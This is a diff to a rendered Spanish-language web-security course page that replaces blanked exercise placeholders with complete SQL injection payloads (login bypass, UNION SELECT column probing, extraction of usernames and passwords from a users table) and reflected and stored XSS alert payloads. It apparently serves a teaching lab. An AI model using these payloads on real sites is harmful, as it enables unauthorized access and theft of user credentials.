@@ -595,21 +595,35 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <section id="paso-1-identificar-el-punto-de-inyección" class="level4" data-number="13.6.1.1">
 <h4 data-number="13.6.1.1" class="anchored" data-anchor-id="paso-1-identificar-el-punto-de-inyección"><span class="header-section-number">13.6.1.1</span> Paso 1: Identificar el punto de inyección</h4>
 <p><strong>Tu tarea</strong>: Probar payloads en el campo de usuario del formulario de login.</p>
-<p><strong>Payloads parciales para completar:</strong></p>
+<p><strong>Payloads para probar (escribir manualmente):</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># En formulario de login, probar:</span></span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">___</span><span class="st">'--</span></span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="st">___'</span> OR <span class="st">'1'</span>=<span class="st">'1</span></span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="st">___'</span> UNION SELECT NULL--</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<p><strong>Pista</strong>: El payload básico usa comillas simples para cerrar la consulta SQL.</p>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="st">'--</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> OR <span class="st">'1'</span>=<span class="st">'1</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> UNION SELECT NULL--</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT 1,2,3--</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Pista</strong>: El payload básico usa comillas simples para cerrar la consulta SQL. El número de columnas debe coincidir con la consulta original.</p>
 <p><strong>Resultado esperado</strong>: Deberías ver un bypass de autenticación o datos extraídos de la base de datos.</p>
 </section>
-<section id="paso-2-extraer-información-de-la-base-de-datos" class="level4" data-number="13.6.1.2">
-<h4 data-number="13.6.1.2" class="anchored" data-anchor-id="paso-2-extraer-información-de-la-base-de-datos"><span class="header-section-number">13.6.1.2</span> Paso 2: Extraer información de la base de datos</h4>
+<section id="paso-2-determinar-número-de-columnas" class="level4" data-number="13.6.1.2">
+<h4 data-number="13.6.1.2" class="anchored" data-anchor-id="paso-2-determinar-número-de-columnas"><span class="header-section-number">13.6.1.2</span> Paso 2: Determinar número de columnas</h4>
+<p><strong>Tu tarea</strong>: Encontrar el número correcto de columnas para UNION SELECT.</p>
+<p><strong>Comandos para probar (incrementar hasta que funcione):</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT NULL--</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> UNION SELECT NULL,NULL--</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT NULL,NULL,NULL--</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> UNION SELECT NULL,NULL,NULL,NULL--</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Resultado esperado</strong>: Cuando el número de columnas es correcto, no verás error de “The used SELECT statements have a different number of columns”.</p>
+</section>
+<section id="paso-3-extraer-información-de-la-base-de-datos" class="level4" data-number="13.6.1.3">
+<h4 data-number="13.6.1.3" class="anchored" data-anchor-id="paso-3-extraer-información-de-la-base-de-datos"><span class="header-section-number">13.6.1.3</span> Paso 3: Extraer información de la base de datos</h4>
 <p><strong>Tu tarea</strong>: Usar UNION SELECT para extraer información de la base de datos.</p>
-<p><strong>Comando parcial:</strong></p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">___</span><span class="st">' UNION SELECT 1,table_name,NULL FROM information_schema.tables--</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<p><strong>Pista</strong>: <code>information_schema.tables</code> contiene los nombres de todas las tablas.</p>
-<p><strong>Resultado esperado</strong>: Lista de tablas de la base de datos.</p>
+<p><strong>Comandos para probar:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT 1,table_name,3 FROM information_schema.tables--</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name=<span class="st">'users'</span>--</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="st">' UNION SELECT 1,username,3 FROM users--</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="st">'</span> UNION SELECT 1,password,3 FROM users--</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Pista</strong>: Primero encuentra las tablas, luego las columnas de esas tablas, finalmente extrae los datos.</p>
+<p><strong>Resultado esperado</strong>: Lista de tablas, columnas y finalmente credenciales de usuarios.</p>
 </section>
 </section>
 <section id="cross-site-scripting-a072021---xss" class="level3" data-number="13.6.2">
@@ -618,25 +632,22 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <section id="paso-1-identificar-campos-vulnerables" class="level4" data-number="13.6.2.1">
 <h4 data-number="13.6.2.1" class="anchored" data-anchor-id="paso-1-identificar-campos-vulnerables"><span class="header-section-number">13.6.2.1</span> Paso 1: Identificar campos vulnerables</h4>
 <p><strong>Tu tarea</strong>: Buscar campos de entrada que no sanitizen el input.</p>
-<p><strong>Comandos parciales para probar:</strong></p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># En campos de búsqueda o comentarios:</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">___</span></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">___</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<p><strong>Payloads parciales:</strong></p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode javascript code-with-copy"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span><span class="fu">alert</span>(<span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">&lt;/</span>script<span class="op">&gt;</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>svg onload<span class="op">=</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="op">&gt;</span></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>img src<span class="op">=</span>x onerror<span class="op">=</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="op">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<p><strong>Pista</strong>: Busca campos donde puedas insertar HTML/JavaScript.</p>
-<p><strong>Resultado esperado</strong>: Alerta de JavaScript ejecutada en el navegador.</p>
+<p><strong>Comandos para probar (escribir manualmente):</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># En campos de búsqueda o comentarios:</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span>alert<span class="kw">(</span><span class="st">'XSS'</span><span class="kw">)</span><span class="op">&lt;</span>/script<span class="op">&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>svg <span class="va">onload</span><span class="op">=</span>alert<span class="kw">(</span><span class="st">'XSS'</span><span class="kw">)</span><span class="op">&gt;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>img <span class="va">src</span><span class="op">=</span>x <span class="va">onerror</span><span class="op">=</span>alert<span class="kw">(</span><span class="st">'XSS'</span><span class="kw">)</span><span class="op">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Pista</strong>: Busca campos donde puedas insertar HTML/JavaScript que se ejecute al cargar la página o al interactuar con el elemento.</p>
+<p><strong>Resultado esperado</strong>: Alerta de JavaScript ejecutada en el navegador que muestra ‘XSS’.</p>
 </section>
 <section id="paso-2-xss-almacenado" class="level4" data-number="13.6.2.2">
 <h4 data-number="13.6.2.2" class="anchored" data-anchor-id="paso-2-xss-almacenado"><span class="header-section-number">13.6.2.2</span> Paso 2: XSS Almacenado</h4>
 <p><strong>Tu tarea</strong>: Encontrar un punto donde el XSS se almacene y se ejecute en otros usuarios.</p>
-<p><strong>Comando parcial:</strong></p>
+<p><strong>Comando para probar:</strong></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Insertar payload en campo que se muestra a otros usuarios:</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">___</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<p><strong>Pista</strong>: Busca funcionalidades como comentarios, perfiles o mensajes.</p>
-<p><strong>Resultado esperado</strong>: Captura de pantalla del <code>alert()</code> ejecutándose.</p>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span>alert<span class="kw">(</span><span class="st">'XSS Stored'</span><span class="kw">)</span><span class="op">&lt;</span>/script<span class="op">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Pista</strong>: Busca funcionalidades como comentarios, perfiles, mensajes o cualquier campo donde tu entrada se guarde y se muestre a otros usuarios posteriormente.</p>
+<p><strong>Resultado esperado</strong>: Captura de pantalla del <code>alert()</code> ejecutándose cuando otro usuario ve la página donde se almacenó el XSS.</p>
 </section>
 </section>
 <section id="broken-access-control-a012021---control-de-acceso-roto" class="level3" data-number="13.6.3">
@@ -1182,7 +1193,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
       &nbsp;
     </div>
     <div class="nav-footer-right">
-<p><a href="about.qmd">Acerca de</a> | <a href="license.qmd">Licencia</a></p>
+<p><a href="../about.html">Acerca de</a> | <a href="../license.html">Licencia</a></p>
 </div>
   </div>
 </footer>
